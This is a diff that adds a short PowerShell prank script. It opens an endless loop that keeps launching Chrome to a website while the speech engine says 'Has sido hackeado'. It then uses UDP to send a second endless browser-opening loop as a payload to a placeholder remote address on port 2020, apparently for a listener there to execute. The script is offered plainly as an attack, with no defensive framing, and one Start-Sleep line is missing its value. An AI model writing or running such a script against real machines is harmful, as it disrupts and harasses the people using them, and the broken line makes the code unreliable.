@@ -1,0 +1,16 @@
+while(2) {
+Start-Process chrome https://www.jesusninoc.com
+Start-Sleep -Seconds 
+(New-Object -com SAPI.SpVoice).speak("Has sido hackeado")
+}
+$port=2020
+$endpoint = new-object System.Net.IPEndPoint ([IPAddress]"x.x.x.x",$port)
+$udpclient=new-Object System.Net.Sockets.UdpClient
+$b=[Text.Encoding]::ASCII.GetBytes("
+while(2) {
+Start-Process chrome https://www.jesusninoc.com
+Start-Sleep -Seconds 5
+}
+")
+$bytesSent=$udpclient.Send($b,$b.length,$endpoint)
+$udpclient.Close()
